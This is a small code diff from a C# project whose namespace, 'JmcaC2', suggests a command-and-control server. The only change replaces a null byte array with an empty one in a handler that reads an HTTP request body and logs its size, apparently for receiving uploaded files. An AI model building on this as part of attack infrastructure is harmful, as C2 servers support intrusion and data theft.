@@ -325,7 +325,7 @@ namespace JmcaC2
                             Console.WriteLine($"[+] Bytes: {fileLength}");
 
 
-                            byte[] bytes = null;
+                            byte[] bytes = [];
                             using (var memoryStream = new MemoryStream())
                             {
                                 context.Request.InputStream.CopyTo(memoryStream);
